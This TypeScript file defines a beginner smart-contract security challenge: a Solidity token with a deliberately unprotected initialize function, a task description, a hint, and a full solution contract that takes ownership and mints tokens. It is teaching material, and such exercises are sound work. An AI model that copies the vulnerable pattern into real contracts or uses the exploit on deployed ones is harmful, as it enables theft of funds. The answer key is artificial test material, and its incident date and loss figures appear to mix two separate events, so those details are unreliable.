import type { VulnerabilityChallenge } from "@/types/vulnerability";

const INITIALIZABLE_TOKEN_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract InitializableToken {
    string public name = "Initializable Token";
    string public symbol = "INIT";
    uint8 public decimals = 18;
    
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Mint(address indexed to, uint256 value);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // VULNERABILITY: No protection against re-initialization!
    // Anyone can call this function and become the owner
    function initialize(address _owner, uint256 _initialSupply) external {
        owner = _owner;
        totalSupply = _initialSupply;
        balanceOf[_owner] = _initialSupply;
        emit OwnershipTransferred(address(0), _owner);
        emit Transfer(address(0), _owner, _initialSupply);
    }
    
    function mint(address to, uint256 amount) external onlyOwner {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Mint(to, amount);
        emit Transfer(address(0), to, amount);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function getOwner() external view returns (address) {
        return owner;
    }
    
    function getBalance(address account) external view returns (uint256) {
        return balanceOf[account];
    }
}`;

export const unprotectedInitChallenge: VulnerabilityChallenge = {
  id: "unprotected-initialize",
  title: "Unprotected Initialize Function",
  category: "access-control",
  difficulty: "beginner",

  incident: {
    name: "Parity Wallet Initialize Bug",
    date: "November 2017",
    losses: "150,000 ETH (~30M USD)",
    references: [
      "https://medium.com/chainsecurity/parity-wallet-hack-2-analyze-the-attacks-5c9c2747a5a",
      "https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7",
    ],
  },

  description: `# Unprotected Initialize Function

## Background

Proxy patterns (like OpenZeppelin's UUPS) separate logic from storage. The implementation contract uses an \`initialize\` function instead of a constructor. This function must be protected!

## The Vulnerability

This token contract has an unprotected \`initialize\` function:

\`\`\`solidity
function initialize(address _owner, uint256 _initialSupply) external {
    owner = _owner;
    totalSupply = _initialSupply;
    balanceOf[_owner] = _initialSupply;
}
\`\`\`

**Missing protections:**
1. No \`initialized\` flag check
2. No access control (anyone can call)
3. No initializer modifier

## Impact

Anyone can:
1. Call \`initialize\` and set themselves as owner
2. Use \`mint\` to create unlimited tokens
3. Drain all funds from the contract

## Real-World Example

The Parity Wallet hack (2017) exploited a similar vulnerability where \`initWallet\` could be called by anyone after deployment.

## Your Task

1. Deploy an exploit contract
2. Call \`initialize\` to become the owner
3. Mint tokens to your contract
4. Goal: Your contract should own more than 1,000,000 tokens

**Target**: The \`InitializableToken\` is deployed but not yet initialized!`,

  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IInitializableToken {
    function initialize(address _owner, uint256 _initialSupply) external;
    function mint(address to, uint256 amount) external;
    function owner() external view returns (address);
    function getOwner() external view returns (address);
    function getBalance(address account) external view returns (uint256);
}

contract Exploit {
    IInitializableToken public token;
    
    constructor(address _token) {
        token = IInitializableToken(_token);
    }
    
    function attack() external {
        // TODO: Exploit the unprotected initialize function
        // 
        // 1. Call initialize() to set yourself as owner
        // 2. Use mint() to create tokens for your contract
        // 
        // Goal: Get more than 1,000,000 tokens
    }
}`,

  hint: "The initialize function has no protection! Just call initialize(your_address, 0) to become the owner, then use mint() to create tokens.",

  setup: {
    contracts: [
      {
        name: "InitializableToken",
        source: INITIALIZABLE_TOKEN_SOURCE,
      },
    ],
    attackerBalance: "10",
  },

  exposedFunctions: [
    {
      name: "owner",
      signature: "owner()",
      inputs: [],
      outputs: [{ name: "", type: "address" }],
      stateMutability: "view",
    },
    {
      name: "getOwner",
      signature: "getOwner()",
      inputs: [],
      outputs: [{ name: "", type: "address" }],
      stateMutability: "view",
    },
    {
      name: "getBalance",
      signature: "getBalance(address)",
      inputs: [{ name: "account", type: "address" }],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "totalSupply",
      signature: "totalSupply()",
      inputs: [],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "initialize",
      signature: "initialize(address,uint256)",
      inputs: [
        { name: "_owner", type: "address" },
        { name: "_initialSupply", type: "uint256" },
      ],
      outputs: [],
      stateMutability: "nonpayable",
    },
    {
      name: "mint",
      signature: "mint(address,uint256)",
      inputs: [
        { name: "to", type: "address" },
        { name: "amount", type: "uint256" },
      ],
      outputs: [],
      stateMutability: "nonpayable",
    },
  ],

  constructorParams: {
    params: [
      {
        name: "_token",
        type: "address",
        description: "The InitializableToken contract address",
      },
    ],
    autoFillOptions: {
      useDeployedContract: "InitializableToken",
    },
  },

  successCondition: {
    checkOwnership: {
      contract: "InitializableToken",
      ownerSlot: "0x2",  // Owner is at slot 2 (after name[s0], symbol[s1])
      expectedOwner: "Exploit",
    },
  },

  solution: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IInitializableToken {
    function initialize(address _owner, uint256 _initialSupply) external;
    function mint(address to, uint256 amount) external;
    function owner() external view returns (address);
}

contract Exploit {
    IInitializableToken public token;
    
    constructor(address _token) {
        token = IInitializableToken(_token);
    }
    
    function attack() external {
        // Step 1: Call initialize to become the owner
        // No protection, anyone can call it!
        token.initialize(address(this), 0);
        
        // Step 2: Mint tokens to this contract
        token.mint(address(this), 2000000 * 10**18); // 2 million tokens
        
        // Now this contract is the owner and has 2M tokens
    }
}`,
};